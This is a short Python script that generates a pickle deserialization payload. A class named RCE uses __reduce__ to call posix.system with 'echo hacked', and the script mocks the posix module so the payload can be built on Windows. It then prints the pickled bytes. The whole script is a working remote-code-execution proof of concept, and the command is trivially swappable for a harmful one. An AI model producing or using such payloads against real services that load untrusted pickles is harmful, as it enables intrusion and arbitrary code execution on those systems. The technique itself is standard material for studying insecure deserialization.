import pickle
import sys

# Mocking posix for Windows
if 'posix' not in sys.modules:
    from types import ModuleType
    m = ModuleType('posix')
    sys.modules['posix'] = m

def system(cmd):
    pass

system.__module__ = 'posix'
system.__name__ = 'system'
system.__qualname__ = 'system'
sys.modules['posix'].system = system

class RCE:
    def __reduce__(self):
        return (system, ("echo hacked",))

p = pickle.dumps(RCE())
print(p)
